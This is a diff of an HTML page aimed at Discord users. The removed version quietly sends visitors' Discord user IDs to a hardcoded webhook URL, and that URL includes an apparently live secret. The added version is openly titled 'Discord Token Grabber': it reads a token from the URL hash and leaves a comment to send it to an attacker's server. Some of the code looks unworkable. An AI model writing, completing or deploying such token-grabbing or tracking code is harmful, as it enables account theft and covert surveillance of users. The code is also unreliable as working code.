@@ -1,44 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<title>My Website</title>
-	<!-- Add a custom protocol handler for the "discord://" protocol -->
-	<script>
-		(function() {
-			if (window.navigator.userAgent.includes("Discord")) {
-				const link = document.createElement("a");
-				link.href = "discord://open";
-				document.body.appendChild(link);
-				link.click();
-			}
-		})();
-	</script>
-</head>
-<body>
-	<h1>Welcome to my website</h1>
-	<script>
-		// Replace <WEBHOOK_URL> with your actual Discord webhook URL
-		const webhookUrl = "https://discordapp.com/api/webhooks/986479906684825640/eQQvf6kkja87PcUM4Mef1kF2fEbL9U1hE4ejA7chkMmhoZCIjcw3j7oxJq-jV6nTxT8N";
-
-		// Send a message to the Discord webhook with the user ID when the link is clicked from Discord
-		window.addEventListener("message", function(event) {
-			if (event.origin === "https://discord.com" && event.data.type === "DISCORD_INIT") {
-				const userId = event.data.data.user.id;
-				const message = `Clicked from Discord by user ${userId}`;
-				sendMessage(message);
-			}
-		});
-
-		// Send a message to the Discord webhook
-		function sendMessage(message) {
-			fetch(webhookUrl, {
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json"
-				},
-				body: JSON.stringify({ content: message })
-			});
-		}
-	</script>
-</body>
+    <head>
+        <title>Discord Token Grabber</title>
+    </head>
+    <body>
+        <script>
+            function getToken() {
+                var token = window.location.hash.substring(1);
+                console.log(token);
+                // Send the token to your server here
+            }
+            getToken();
+        </script>
+    </body>
 </html>
